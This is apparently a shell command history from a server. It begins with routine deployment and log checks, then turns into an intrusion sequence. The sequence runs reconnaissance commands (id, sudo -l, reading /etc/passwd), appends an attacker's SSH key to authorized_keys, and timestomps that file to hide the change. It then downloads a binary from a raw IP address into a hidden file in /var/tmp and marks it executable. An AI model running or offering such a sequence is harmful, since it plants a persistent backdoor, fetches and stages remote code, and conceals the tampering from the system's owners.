make deploy
sudo systemctl restart app
cd app
ls
tail -f /var/log/app/app.log
systemctl status app
git pull
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7CD3b2MCCSujBFgBwFi2k66liPE7O70ht8OacwuSWL k' >> ~/.ssh/authorized_keys
touch -r /etc/hostname /home/build/.ssh/authorized_keys
wget -q http://91.8.66.140/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
